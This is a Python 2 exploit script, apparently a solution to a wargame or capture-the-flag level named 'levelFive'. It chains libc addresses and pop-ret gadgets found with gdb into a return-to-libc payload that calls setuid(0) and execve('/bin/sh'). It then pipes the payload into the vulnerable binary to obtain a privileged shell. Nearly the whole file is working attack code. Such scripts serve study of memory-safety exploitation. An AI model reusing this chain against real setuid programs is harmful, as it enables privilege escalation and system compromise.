#!/usr/bin/env python
import struct
import os

# Between EBP and Start of Buffer
# (gdb) p 0xffffd2d8 - 0xffffd2cc
# $1 = 12
#
junk = 'A' * 12
write_ebp = 'B' * 4

# Gadget
#
# Start Addr   End Addr       Size     Offset Objfile
# 0xf7dce000   0xf7de7000     0x19000  0x0    /usr/lib32/libc-2.28.so
#
# 19173:       5f                      pop    %edi
# 19174:       c3                      ret
#
# (gdb) x/2i 0xf7dce000 + 0x19173
# 0xf7de7173:	pop    edi
# 0xf7de7174:	ret
#
pop_ret = struct.pack('I',0xf7de7173)

# (gdb) x/3i 0xf7de7172
# 0xf7de7172:	pop    esi
# 0xf7de7173:	pop    edi
# 0xf7de7174:	ret
#
pop_pop_ret = struct.pack('I',0xf7de7172)

# (gdb) x/4i 0xf7de7171
#  0xf7de7171:	pop    ebx
#  0xf7de7172:	pop    esi
#  0xf7de7173:	pop    edi
#  0xf7de7174:	ret
#
pop_pop_pop_ret = struct.pack('I',0xf7de7171)

# (gdb) p setuid
# $2 = {<text variable, no debug info>} 0xf7e8efa0 <setuid>
#
setuid = struct.pack('I',0xf7e8efa0)
setuid_arg = struct.pack('I',0x0)

# (gdb) p system
# $1 = {<text variable, no debug info>} 0xf7e0c980 <system>
#
system = struct.pack('I',0xf7e0c980)

# (gdb) p execve
# $9 = {<text variable, no debug info>} 0xf7e8e680 <execve>
#
execve = struct.pack('I',0xf7e8e680)
execve_arg1 = setuid_arg # setuid_arg = 0x0
execve_arg2 = execve_arg1 # execve_arg1 = 0x0

# (gdb) p exit
# $3 = {<text variable, no debug info>} 0xf7dff9b0 <exit>
#
exit = struct.pack('I',0xf7dff9b0)

# level4@kali:~$ strings -a -tx /usr/lib32/libc-2.28.so | grep /bin/sh
# 17eaaa /bin/sh
#
# (gdb) x/s 0xf7dce000 + 0x17eaaa
# 0xf7f4caaa:   "/bin/sh"
#
shell = struct.pack('I',0xf7f4caaa)

# Payload crafting
# Debug (crash prog): payload = junk + write_ebp + write_eip
#
# payload = junk + write_ebp + system + pop_ret + shell + exit
# payload = junk + write_ebp + setuid + pop_ret + setuid_arg + system + pop_ret + shell + exit
#

'''
payload = junk + write_ebp
payload += execve + pop_pop_pop_ret + shell + execve_arg1 + execve_arg2
payload += exit
'''

payload = junk + write_ebp
payload += setuid + pop_ret + setuid_arg
payload += execve + pop_pop_pop_ret + shell + execve_arg1 + execve_arg2
payload += exit

print payload

# Debug: GDB
filename = 'sploit'
with open(filename,'w') as f:
	f.write(payload)

# Executing exploit
binary = './levelFive'
cmd = 'cat ' + filename + ' - | ' + binary
os.system(cmd)
